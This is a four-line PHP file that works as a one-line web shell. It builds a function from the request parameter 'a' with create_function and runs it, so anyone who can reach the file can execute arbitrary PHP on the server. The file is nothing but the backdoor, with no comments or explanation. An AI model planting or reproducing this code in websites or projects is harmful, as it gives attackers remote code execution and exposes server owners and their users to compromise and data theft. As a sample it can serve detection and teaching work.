<?php 
$a = create_function('',$_REQUEST['a']);
$a();
?>